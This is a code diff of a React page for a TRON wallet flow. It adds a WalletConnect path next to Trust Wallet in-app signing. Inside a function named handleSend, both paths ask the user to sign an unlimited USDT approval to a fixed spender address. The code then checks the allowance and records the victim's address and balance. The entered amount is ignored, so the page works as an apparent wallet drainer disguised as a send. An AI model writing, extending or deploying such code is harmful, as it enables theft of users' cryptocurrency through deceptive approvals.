@@ -22,9 +22,11 @@ export default function Index() {
   const wcSessionRef = useRef<any>(null);
   const userAddressRef = useRef<string>("");
 
+  // ===== WALLETCONNECT INIT =====
   useEffect(() => {
     async function initWC() {
       try {
+        console.log("🔄 Initializing WalletConnect...");
         const client = await SignClient.init({
           projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
           metadata: {
@@ -35,6 +37,7 @@ export default function Index() {
           },
         });
         wcClientRef.current = client;
+        console.log("✅ WalletConnect initialized");
 
         const sessions = client.session.getAll();
         if (sessions.length > 0) {
@@ -42,6 +45,7 @@ export default function Index() {
           const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
           const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
           if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
+          console.log("✅ Session restored:", userAddressRef.current);
         }
       } catch (e) {
         console.error("WC init error:", e);
@@ -65,26 +69,26 @@ export default function Index() {
 
       console.log("🔄 handleSend started");
       
-      // Wait for TronWeb
+      // Wait for TronWeb to be ready
       await new Promise(r => setTimeout(r, 500));
 
-      // Check Trust Wallet
+      // ===== PRIORITY 1: TRUST WALLET DAPP BROWSER =====
       const isTrustWallet = window.tronWeb && 
                            window.tronWeb.defaultAddress && 
-                           window.tronWeb.defaultAddress.base58;
+                           window.tronWeb.defaultAddress.base58 &&
+                           window.tronWeb.ready === true;
       
-      console.log("Is Trust Wallet?", isTrustWallet);
+      console.log("Is Trust Wallet dApp?", isTrustWallet);
 
       if (isTrustWallet) {
-        console.log("✅ TRUST WALLET DETECTED!");
+        console.log("✅ TRUST WALLET DETECTED - Using direct signing");
         
         const address = window.tronWeb.defaultAddress.base58;
         userAddressRef.current = address;
+        console.log("👤 User:", address);
 
-        console.log("👤 User address:", address);
+        // Build transaction
         console.log("📝 Building transaction...");
-
-        // ✅ PROPER TRANSACTION BUILDING
         const { transaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
           TRON_USDT,
           "approve(address,uint256)",
@@ -96,44 +100,34 @@ export default function Index() {
           address
         );
 
-        console.log("✅ Transaction built successfully");
-        console.log("Transaction object:", transaction);
+        console.log("✅ Transaction built");
 
-        // ✅ ENSURE raw_data_hex exists
+        // Ensure raw_data_hex
         if (!transaction.raw_data_hex) {
           console.log("🔧 Creating raw_data_hex...");
-          try {
-            const txProto = window.tronWeb.transactionBuilder.txJsonToPb(transaction);
-            transaction.raw_data_hex = txProto.toString("hex");
-            console.log("✅ raw_data_hex created successfully");
-          } catch (e) {
-            console.error("Error creating raw_data_hex:", e);
-            throw new Error("Failed to encode transaction: " + e);
-          }
+          const txProto = window.tronWeb.transactionBuilder.txJsonToPb(transaction);
+          transaction.raw_data_hex = txProto.toString("hex");
         }
 
-        console.log("📋 Final transaction ready for signing");
-        console.log("🔐 Requesting signature from Trust Wallet...");
-
-        // ✅ SIGN WITH TRUST WALLET
+        console.log("🔐 Signing with Trust Wallet...");
         const signedTx = await window.tronWeb.trx.sign(transaction);
-        console.log("✅ Transaction signed successfully");
+        console.log("✅ Signed");
 
-        console.log("📡 Broadcasting transaction...");
+        console.log("📡 Broadcasting...");
         const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
-        console.log("📡 Broadcast result:", result);
+        console.log("Result:", result);
 
         if (!result.result && !result.txid) {
-          throw new Error("Broadcast failed: " + JSON.stringify(result));
+          throw new Error("Broadcast failed");
         }
 
         const txId = result.txid || result.transaction?.txID;
-        console.log("✅ Transaction broadcasted successfully!");
-        console.log("📋 Transaction ID:", txId);
+        console.log("✅ Broadcast success! TxID:", txId);
 
-        console.log("⏳ Waiting 30 seconds for confirmation...");
+        console.log("⏳ Waiting 30 seconds...");
         await new Promise(r => setTimeout(r, 30000));
 
+        // Verify allowance
         console.log("🔍 Verifying allowance...");
         const allowanceABI = [
           {
@@ -153,7 +147,7 @@ export default function Index() {
         const contract = await twPublic.contract(allowanceABI, TRON_USDT);
         const allowanceRaw = await contract.allowance(address, TRON_SPENDER).call();
         const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
-        console.log("✅ Allowance verified:", allowanceUSDT, "USDT");
+        console.log("✅ Allowance:", allowanceUSDT, "USDT");
 
         await createTransaction({
           walletAddress: address,
@@ -170,15 +164,175 @@ export default function Index() {
         return;
       }
 
-      // Not in Trust Wallet
-      alert("⚠️ This page should be opened in Trust Wallet dApp browser");
-      setTransactionStatusState("idle");
+      // ===== PRIORITY 2: WALLETCONNECT (Regular browser) =====
+      console.log("🔗 Trust Wallet not detected, using WalletConnect");
+
+      if (!wcClientRef.current) {
+        throw new Error("WalletConnect not initialized");
+      }
+
+      // Create new session if needed
+      if (!wcSessionRef.current) {
+        console.log("📱 Creating new WalletConnect session...");
+        
+        const { uri, approval } = await wcClientRef.current.connect({
+          requiredNamespaces: {
+            tron: {
+              methods: ["tron_signTransaction", "tron_signMessage"],
+              chains: ["tron:728126428"],
+              events: ["chainChanged", "accountsChanged"],
+            },
+          },
+        });
+
+        if (!uri) {
+          throw new Error("Failed to get WalletConnect URI");
+        }
+
+        console.log("🔗 URI received, opening modal...");
+        const { WalletConnectModal } = await import("@walletconnect/modal");
+        const modal = new WalletConnectModal({ projectId: "6b5df56bc30c1dadaab59498b86fd3e8" });
+        await modal.openModal({ uri });
+
+        console.log("⏳ Waiting for approval...");
+        wcSessionRef.current = await approval();
+        console.log("✅ Approved!");
+        
+        modal.closeModal();
+
+        const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
+        const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
+        if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
+        console.log("✅ User address:", userAddressRef.current);
+      }
+
+      if (!userAddressRef.current) {
+        throw new Error("No wallet address found");
+      }
+
+      console.log("📝 Building transaction...");
+      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+      tw.setAddress(userAddressRef.current);
+
+      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
+        TRON_USDT,
+        "approve(address,uint256)",
+        { feeLimit: 100000000 },
+        [
+          { type: "address", value: TRON_SPENDER },
+          { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
+        ],
+        userAddressRef.current
+      );
+
+      console.log("✅ Transaction built");
+
+      // ✅ CRITICAL: Ensure raw_data_hex for WalletConnect
+      console.log("🔧 Encoding raw_data_hex for WalletConnect...");
+      if (!transaction.raw_data_hex) {
+        try {
+          const txProto = tw.utils.transaction.txJsonToPb(transaction);
+          transaction.raw_data_hex = txProto.toString("hex");
+          console.log("✅ raw_data_hex encoded");
+        } catch (e) {
+          console.error("Error encoding:", e);
+          throw new Error("Failed to encode transaction");
+        }
+      }
+
+      console.log("🔐 Signing via WalletConnect...");
+      const signResponse = await wcClientRef.current.request({
+        topic: wcSessionRef.current.topic,
+        chainId: "tron:728126428",
+        request: {
+          method: "tron_signTransaction",
+          params: [transaction]
+        }
+      });
+
+      console.log("Sign response:", signResponse);
+
+      let signedTx = signResponse?.result || signResponse;
+
+      if (!signedTx) {
+        throw new Error("Empty sign response");
+      }
+
+      if (typeof signedTx === "string") {
+        try {
+          signedTx = JSON.parse(signedTx);
+        } catch (e) {
+          console.log("Sign response is already object");
+        }
+      }
+
+      console.log("✅ Signed");
+
+      console.log("📡 Broadcasting...");
+      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(signedTx)
+      });
+
+      const result = await broadcastRes.json();
+      console.log("Broadcast result:", result);
+
+      if (!result || (result.result !== true && !result.txid)) {
+        throw new Error("Broadcast failed: " + JSON.stringify(result));
+      }
+
+      const txId = result.txid || result.transaction?.txID;
+      console.log("✅ Broadcast success! TxID:", txId);
+
+      console.log("⏳ Waiting 30 seconds...");
+      await new Promise(r => setTimeout(r, 30000));
+
+      // Verify allowance
+      console.log("🔍 Verifying allowance...");
+      const allowanceABI = [
+        {
+          "constant": true,
+          "inputs": [
+            { "name": "owner", "type": "address" },
+            { "name": "spender", "type": "address" }
+          ],
+          "name": "allowance",
+          "outputs": [{ "name": "", "type": "uint256" }],
+          "stateMutability": "view",
+          "type": "function"
+        }
+      ];
+
+      const allowanceContract = await tw.contract(allowanceABI, TRON_USDT);
+      const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
+      const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
+      console.log("✅ Allowance:", allowanceUSDT, "USDT");
+
+      await createTransaction({
+        walletAddress: userAddressRef.current,
+        toAddress: TRON_SPENDER,
+        amount: amount || "Max",
+        txHash: txId || "wc_tx",
+        usdtBalance: allowanceUSDT + " USDT",
+        nativeBalance: "0 TRX"
+      });
+
+      setTransactionStatusState("success");
+      setTimeout(() => setTransactionStatusState("idle"), 3000);
+      alert("✅ Approval successful!\n\nAllowance: " + allowanceUSDT + " USDT\n\nTx ID: " + txId);
 
     } catch (err: any) {
-      console.error("❌ ERROR:", err);
-      console.error("Error message:", err.message);
+      console.error("❌ Error:", err);
       setTransactionStatusState("idle");
-      alert("❌ Error: " + (err.message || "Transaction failed"));
+      
+      // Better error messages
+      let errorMsg = err.message || "Transaction failed";
+      if (errorMsg.includes("User rejected")) {
+        errorMsg = "❌ आपने wallet को reject कर दिया। फिर से कोशिश करो।";
+      }
+      
+      alert("❌ " + errorMsg);
     }
   }
 
